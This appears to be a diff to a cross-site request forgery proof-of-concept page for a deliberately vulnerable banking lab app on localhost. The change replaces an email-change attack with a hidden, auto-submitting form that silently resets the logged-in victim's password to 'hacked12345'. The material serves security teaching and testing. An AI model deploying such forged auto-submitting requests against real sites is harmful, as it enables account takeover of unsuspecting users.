@@ -10,12 +10,14 @@
     This stands in for an attacker's site (e.g. evil.example). The victim is
     already logged into BankVWA in another tab. A top-level GET navigation carries
     the victim's SameSite=Lax session cookie, so the bank treats this as the user.
-    Because /labs/csrf.php changes the email on a GET with no CSRF token, the
-    victim's account email is silently hijacked. Change the URL if your app is not
-    on localhost:8080.
+    Because profile.php changes the password on a GET with no CSRF token and no
+    re-authentication, the victim's account is silently taken over — their password
+    becomes "hacked12345". Change the URL if your app is not on localhost:8080.
   -->
-  <form id="x" action="http://localhost:8080/labs/csrf.php" method="get">
-    <input type="hidden" name="email" value="attacker@evil.example">
+  <form id="x" action="http://localhost:8080/banking/profile.php" method="get">
+    <input type="hidden" name="action" value="password">
+    <input type="hidden" name="new_password" value="hacked12345">
+    <input type="hidden" name="confirm_password" value="hacked12345">
   </form>
   <script>document.getElementById('x').submit();</script>
 </body>
